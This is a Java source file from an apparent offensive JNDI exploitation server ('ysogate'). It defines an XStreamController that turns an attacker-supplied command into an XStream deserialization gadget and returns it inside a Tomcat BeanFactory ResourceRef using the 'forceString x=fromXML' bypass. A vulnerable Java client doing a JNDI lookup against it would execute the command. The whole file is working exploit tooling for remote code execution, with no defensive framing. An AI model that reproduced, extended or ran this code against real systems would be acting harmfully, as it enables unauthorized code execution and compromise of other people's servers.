package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.Controller;
import com.h2tg.ysogate.payloads.gadgets.XStream39149;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;


@JNDIController
@JNDIMapping("/XStream")
public class XStreamController implements Controller
{
    @Override
    public Object process(Object obj) throws Exception
    {
        String cmd = obj.toString();
        System.out.println("[Reference] Factory: BeanFactory + XStream");

        XStream39149 xstream = new XStream39149();
        String xml = (String) xstream.getObject(cmd);

        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=fromXML"));
        ref.add(new StringRefAddr("x", xml));
        return ref;
    }

    @JNDIMapping("/{cmd}")
    public String detectClass(String cmd) {
        System.out.println("[XStream] Command: " + cmd);
        return cmd;
    }
}
